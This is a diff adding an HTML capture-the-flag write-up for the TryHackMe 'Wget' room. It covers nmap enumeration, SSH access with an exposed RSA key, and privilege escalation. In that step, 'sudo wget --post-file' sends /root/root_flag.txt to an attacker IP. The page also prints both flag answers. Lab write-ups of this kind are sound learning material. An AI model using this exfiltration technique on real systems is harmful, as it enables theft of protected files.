@@ -1,0 +1,150 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Wget Writeup - David John</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #edf6f9;
+            color: #333;
+            line-height: 1.6;
+        }
+        header {
+            background: #006d77;
+            color: #fff;
+            padding: 2rem;
+            text-align: center;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+        }
+        nav {
+            display: flex;
+            justify-content: center;
+            background: #83c5be;
+            padding: 1rem;
+        }
+        nav a {
+            color: #fff;
+            text-decoration: none;
+            margin: 0 1.5rem;
+            padding: 0.5rem 1rem;
+            border-radius: 4px;
+            transition: background-color 0.3s;
+        }
+        nav a:hover { background-color: #006d77; }
+        main {
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 2rem;
+            margin-bottom: 100px;
+        }
+        .back-link {
+            display: inline-block;
+            margin-bottom: 1.5rem;
+            color: #006d77;
+            text-decoration: none;
+        }
+        .back-link:hover { text-decoration: underline; }
+        .content-section {
+            background: white;
+            padding: 2rem;
+            border-radius: 8px;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+            margin-bottom: 2rem;
+        }
+        .content-section h2 { color: #006d77; }
+        .content-section h3 { color: #006d77; margin-top: 2rem; }
+        .content-section pre {
+            background: #f4f4f4;
+            padding: 1rem;
+            border-radius: 4px;
+            overflow-x: auto;
+            font-size: 0.85rem;
+        }
+        .content-section img {
+            max-width: 100%;
+            border-radius: 4px;
+            border: 1px solid #ddd;
+            margin: 0.75rem 0;
+            display: block;
+        }
+        .writeup-tags span {
+            display: inline-block;
+            background: #edf6f9;
+            color: #006d77;
+            font-size: 0.8rem;
+            padding: 0.2rem 0.6rem;
+            border-radius: 4px;
+            margin-right: 0.5rem;
+        }
+        footer {
+            background: #333;
+            color: #fff;
+            text-align: center;
+            padding: 1rem;
+            position: fixed;
+            bottom: 0;
+            width: 100%;
+        }
+        @media (max-width: 600px) {
+            nav { flex-direction: column; align-items: center; }
+            nav a { margin: 0.5rem 0; }
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>David John</h1>
+    </header>
+    <nav>
+        <a href="../index.html">Home</a>
+        <a href="../writeups.html">Writeups</a>
+    </nav>
+    <main>
+        <a class="back-link" href="../writeups.html">&larr; Back to all writeups</a>
+        <section class="content-section">
+            <h2>Wget</h2>
+            <div class="writeup-tags">
+                <span>TryHackMe</span>
+                <span>Linux</span>
+                <span>SSH</span>
+                <span>Easy</span>
+            </div>
+
+            <h3>Enumeration</h3>
+            <pre>nmap -sV -T4 -A -p 10.10.249.219</pre>
+            <img src="../images/wget/nmap-1.png" alt="Nmap scan results">
+            <p>We have an HTTP server up. Looks to be the default Apache landing page. Looking further into the source, however, reveals an important piece of information.</p>
+            <img src="../images/wget/source-jessie-1.png" alt="Page source code revealing the name Jessie">
+            <p>Jessie could be a potential user, but for now let's do some subdomain enumeration.</p>
+            <img src="../images/wget/dirbuster-1.png" alt="DirBuster results">
+            <p>It found one named <code>sitemap</code>.</p>
+            <img src="../images/wget/sitemap-1.png" alt="Sitemap subdirectory contents">
+            <p>Nothing interesting on this subdomain, let's keep looking.</p>
+            <img src="../images/wget/rsa-key-1.png" alt="RSA private key discovered">
+            <p>We can now SSH with jessie as our user and this RSA key.</p>
+            <pre>nano id_rsa
+chmod 600 id_rsa</pre>
+
+            <h3>SSH as Jessie</h3>
+            <img src="../images/wget/ssh-jessie-1.png" alt="Successful SSH login as jessie">
+            <p>We're in. Looking around the home directory leads us to the user flag.</p>
+            <img src="../images/wget/user-flag-1.png" alt="User flag">
+
+            <h3>Privilege Escalation</h3>
+            <img src="../images/wget/sudol-1.png" alt="sudo -l showing wget is allowed">
+            <p>We have sudo privileges for <code>wget</code> — fitting for the room name. We can use this to POST the root flag directly to our machine.</p>
+            <img src="../images/wget/wget-exfil-1.png" alt="Using wget --post-file to exfiltrate the root flag">
+            <pre>sudo /usr/bin/wget --post-file=/root/root_flag.txt http://10.13.87.5:3243/</pre>
+            <p>And there we go.</p>
+            <pre>User: 057c67131c3d5e42dd5cd3075b198ff6
+Root: b1b968b37519ad1daa6408188649263d</pre>
+        </section>
+    </main>
+    <footer>
+        <p>2026, David John</p>
+    </footer>
+</body>
+</html>
